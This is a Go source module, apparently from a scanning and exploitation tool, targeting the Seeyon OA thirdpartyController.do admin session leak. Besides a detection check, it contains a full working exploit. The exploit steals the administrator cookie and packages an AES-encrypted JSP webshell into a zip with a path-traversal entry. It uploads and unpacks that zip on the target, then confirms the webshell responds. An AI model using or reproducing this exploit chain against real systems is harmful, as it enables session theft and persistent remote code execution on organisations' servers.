package vulners

import (
	"archive/zip"
	"bytes"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

var (
	WebshellName string
)

type Sy02 struct {
}

func (s *Sy02) Scan(targetUrl string) {
	vulnerable, err := sy02scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[+]存在thirdpartyController.do管理员session泄露")
	} else {
		color.White("[-]不存在thirdpartyController.do管理员session泄露")
	}
}

func sy02scancore(targetUrl string) (bool, error) {
	sessionLeakPayload := "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
	req, err := http.NewRequest("POST", targetUrl+"/seeyon/thirdpartyController.do", strings.NewReader(sessionLeakPayload))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	resContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	if resp.Header.Get("Set-Cookie") != "" && (strings.Contains(string(resContent), "a8genius.do")) {
		return true, nil
	} else {
		return false, nil
	}
}

func getCookie(targetUrl string) (cookiestr string) {
	adminCookie := ""
	sessionLeakPayload := "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
	req, err := http.NewRequest("POST", targetUrl+"/seeyon/thirdpartyController.do", strings.NewReader(sessionLeakPayload))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	if err != nil {
		color.Red("[x]探测失败！（req）")
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		color.Red("[x]探测失败！（req）")
	}
	defer resp.Body.Close()
	resContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red("[x]探测失败！（resp）")
	}
	isExist := (resp.Header.Get("Set-Cookie") != "") && (strings.Contains(string(resContent), "a8genius.do"))
	if isExist {
		adminCookie = resp.Header.Get("Set-Cookie")[:44]
		color.Green("[+]Cookie获取成功：" + adminCookie)
	} else {
		color.White("[-]获取Cookie失败！")
		adminCookie = ""
	}
	return adminCookie
}

func createZip() (string, error) {
	shellData := "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter(\"seeyoner\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>"
	WebshellName = RandStringRunes(10) + ".jsp"
	buf := new(bytes.Buffer)
	w := zip.NewWriter(buf)
	var files = []struct {
		Name, Body string
	}{
		{"layout.xml", ""},
		{"../" + WebshellName, shellData},
	}
	for _, file := range files {
		f, err := w.Create(file.Name)
		if err != nil {
			return "", err
		}
		_, err = f.Write([]byte(file.Body))
		if err != nil {
			return "", err
		}
	}
	// 关闭压缩文档
	err := w.Close()
	if err != nil {
		return "", err
	}
	// 将压缩文档内容写入文件
	zipFileName := RandStringRunes(5) + ".zip"
	f, err := os.OpenFile(zipFileName, os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		return "", err
	}
	buf.WriteTo(f)
	return zipFileName, nil
}

func uploadZipFile(uri string, params map[string]string, paramName, path string, cookie string) (*http.Request, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	fileContents, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}
	fi, err := file.Stat()
	if err != nil {
		return nil, err
	}
	file.Close()

	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, fi.Name())
	if err != nil {
		return nil, err
	}
	part.Write(fileContents)

	for key, val := range params {
		_ = writer.WriteField(key, val)
	}
	err = writer.Close()
	if err != nil {
		return nil, err
	}
	request, err := http.NewRequest("POST", uri, body)
	request.Header.Add("Content-Type", writer.FormDataContentType())
	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	request.Header.Add("Cookie", cookie)
	return request, err
}

func unzipShell(targetUrl string, adminCookie string, respContent string) {
	oYear := time.Now().Year()
	oMonth := time.Now().Format("01")
	oDay := time.Now().Format("02")
	dateArgs := fmt.Sprintf("%d-%s-%s", oYear, oMonth, oDay)
	re := regexp.MustCompile(`(?i)fileurls=fileurls\+","\+\'(.+)\'`)
	shellfileid := re.FindStringSubmatch(respContent)[1]
	color.White("[!]上传文件id：" + re.FindStringSubmatch(respContent)[1])
	unzipshellPayload := "method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=[0,\"" + dateArgs + "\",\"" + shellfileid + "\"]"
	req, err := http.NewRequest("POST", targetUrl+"/seeyon/ajax.do", strings.NewReader(unzipshellPayload))
	if nil != err {
		color.Red("[x]ajax.do接口请求失败！")
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	req.Header.Set("Cookie", adminCookie)
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		color.Red("[x]ajax.do接口请求失败！")
		return
	}
	defer resp.Body.Close()
	if err != nil {
		color.Red("[x]ajax.do接口返回异常！")
		return
	}
	if resp.StatusCode == 500 {
		color.Green("[+]zip文件解压成功！")
		color.White("[*]Webshell连接地址：" + targetUrl + "/seeyon/common/designer/pageLayout/" + WebshellName)
		color.White("[*]探测Webshell存活状态...")
		r, err := http.Get(targetUrl + "/seeyon/common/designer/pageLayout/" + WebshellName)
		if err != nil {
			color.Red("[x]Webshell访问异常！")
			return
		}
		defer r.Body.Close()
		if r.StatusCode == 200 {
			color.Green("[+]Webshell连接成功！")
		} else {
			color.Red("[x]Webshell连接失败！")
		}
	}
}

func (*Sy02) Exploit(targetUrl string) {
	adminCookie := getCookie(targetUrl)
	zipFileName, err := createZip()
	if err != nil {
		color.Red("[x]zip文件创建失败！")
		return
	}
	zipFilePath := "./" + zipFileName
	color.Green("[+]zip文件创建成功，路径：" + zipFilePath)
	vulnPath := targetUrl + "/seeyon/fileUpload.do?method=processUpload"
	extraParams := map[string]string{
		"firstSave":  "true",
		"callMethod": "resizeLayout",
		"isEncrypt":  "0",
		"takeOver":   "false",
		"type":       "0",
	}
	request, err := uploadZipFile(vulnPath, extraParams, "file", zipFilePath, adminCookie)
	if err != nil {
		color.Red("[x]上传zip文件失败！")
		return
	}
	//fmt.Println(request.Body)
	client := &http.Client{}
	resp, err := client.Do(request)
	if err != nil {
		color.Red("[x]上传zip文件失败！")
		return
	}
	defer resp.Body.Close()
	respContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red("[x]读取返回时异常！")
		return
	}
	if strings.Contains(string(respContent), "fileurls") {
		color.Green("[+]zip文件上传成功！")
		unzipShell(targetUrl, adminCookie, string(respContent))
	}
}

func RandStringRunes(n int) string {
	rand.Seed(time.Now().UnixNano())
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
